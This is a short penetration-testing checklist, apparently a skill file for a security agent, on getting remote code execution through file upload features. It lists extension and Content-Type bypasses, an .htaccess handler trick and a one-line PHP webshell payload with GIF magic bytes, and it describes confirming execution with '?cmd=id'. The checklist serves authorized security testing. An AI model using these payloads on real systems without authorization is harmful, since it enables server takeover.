---
name: file-upload-rce
aliases: [file-upload-rce, file-upload, upload, upload-rce, rce, webshell, remote-code-execution]
tags: [file-upload, rce, webshell, owasp-a05]
severity: critical
---
<!-- Adapted from xalgorix (MIT) — internal/tools/skills/data/web-application-security/exploiting-file-upload-vulnerabilities/SKILL.md -->

# File Upload → RCE

## When to Use
- Any upload feature (avatars, documents, attachments, galleries, file managers).
- File-processing features (image resize, doc conversion, CSV/XML import) and multipart API endpoints.

## Critical Checks Most Often Missed
**Extension bypass matrix (PHP/ASP/JSP):**
`shell.php5`, `shell.phtml`, `shell.pHp` (case), `shell.php.jpg` / `shell.jpg.php` (double ext), `shell.php%00.jpg` (null byte, legacy), `shell.php;.jpg` / `shell.php/` (parser confusion), `shell.php.` / `shell.php ` (trailing dot/space, Windows trims and executes), `shell.asp;.jpg`, `shell.aspx`, `shell.jsp`, `shell.svg`.
- **Content-Type spoof:** send a PHP body but declare `Content-Type: image/png`.
- **Magic-byte prefixing** to pass content sniffing: `GIF89a<?php system($_GET["cmd"]); ?>`, JPEG/PNG magic + PHP.
- **Handler-enabling uploads:** `.htaccess` (`AddType application/x-httpd-php .xyz` then upload `shell.xyz`) on Apache; `web.config` on IIS.
- **Polyglots:** GIFAR, phar-jpg — valid image AND executable.
- **SVG stored XSS / XXE** when "images" are allowed but rendered inline.

## Validation / Confirm Steps
- **Locate the stored file** (response often leaks the path; otherwise fuzz `/uploads/`) and **request it back**.
- Confirm RCE by executing a benign command — `?cmd=id` returns `uid=...`, or an OOB callback fires. A 200 on upload alone is not RCE.
- For `.htaccess`/`web.config` chains, confirm the new handler actually executes a benign extension.

## False-Positive Traps
- Upload accepted (200) ≠ exploitable — the file may be stored outside webroot, renamed to a random name, or served with `Content-Disposition: attachment` (no execution).
- A reachable file that returns its **source** (not executed) means the handler is not mapped — try handler-enabling tricks or a different extension before reporting RCE.
- Test/throwaway content only (`shell.php.jpg`, `test.gif`); never leave a live webshell — clean up after confirming.
